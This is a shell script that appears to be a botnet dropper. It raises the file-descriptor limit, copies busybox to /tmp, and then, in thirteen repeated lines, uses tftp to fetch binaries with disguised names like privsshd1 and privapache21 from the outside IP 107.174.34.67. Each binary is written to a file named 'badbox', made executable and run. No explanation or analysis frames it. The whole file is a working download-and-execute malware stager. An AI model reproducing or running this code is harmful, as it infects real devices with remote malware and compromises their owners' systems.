#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privntpd1 -g 107.174.34.67;cat privntpd1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privsshd1 -g 107.174.34.67;cat privsshd1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privopenssh1 -g 107.174.34.67;cat privopenssh1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privbash1 -g 107.174.34.67;cat privbash1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privtftp1 -g 107.174.34.67;cat privtftp1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privwget1 -g 107.174.34.67;cat privwget1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privcron1 -g 107.174.34.67;cat privcron1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privftp1 -g 107.174.34.67;cat privftp1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privpftp1 -g 107.174.34.67;cat privpftp1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privsh1 -g 107.174.34.67;cat privsh1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privnut1 -g 107.174.34.67;cat privnut1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privapache21 -g 107.174.34.67;cat privapache21 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privtelnetd1 -g 107.174.34.67;cat privtelnetd1 >badbox;chmod +x *;./badbox
